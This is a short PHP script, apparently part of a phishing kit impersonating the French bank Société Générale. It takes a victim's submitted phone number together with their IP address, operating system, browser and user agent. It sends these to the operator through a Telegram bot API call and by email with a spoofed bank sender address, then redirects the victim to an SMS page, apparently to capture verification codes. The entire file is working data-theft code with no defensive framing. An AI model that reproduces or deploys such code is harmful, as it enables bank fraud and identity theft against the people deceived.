<?php


/*

Author : DIB
Email : christtouko29@gmx.fr
ICQ : @MorrisWorm

*/
if(isset($_POST['tel'])){
	
include "../config.php";
include "funcs.php";

$tel =  $_POST['tel'];

$message = "\n📋 Telephone: $tel\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
$headers = "From:  Societe Generale  <norepl@pabloescobard.com>";
//$headers .= "Content-type: text/html; charset=UTF-8\n";
$subject = "🔔 N° Tel |  $ip";

$emaillist = explode(',',$to);

foreach($emaillist as $email){
mail($email,$subject,$message,$headers,$head);
}
file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat."&text=" . urlencode($message)."" );

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../sms.php\" />";



}
?>